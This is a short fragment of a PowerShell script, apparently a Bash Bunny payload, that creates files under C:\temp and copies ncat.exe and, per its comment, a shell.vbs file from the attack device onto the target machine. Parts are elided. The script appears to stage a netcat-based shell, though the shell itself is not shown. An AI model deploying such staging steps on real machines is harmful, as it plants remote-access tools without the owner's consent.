...
$user = $env:UserName
$netcatFile = $driveName + "payloads\switch1\ncat.exe"
$ncatDestFile = "C:\temp\ncat.exe"
...
If ((Test-Path $ncatDestFile) -eq $false){
	New-Item -ItemType File -Path $ncatDestFile -Force
}
If ((Test-Path $scriptDestFile) -eq $false){
	New-Item -ItemType File -Path $scriptDestFile -Force
}

## Copy shell.vbs and ncat.exe from the BB to their destined locations
Copy-Item -Path $netcatFile -Destination $ncatDestFile
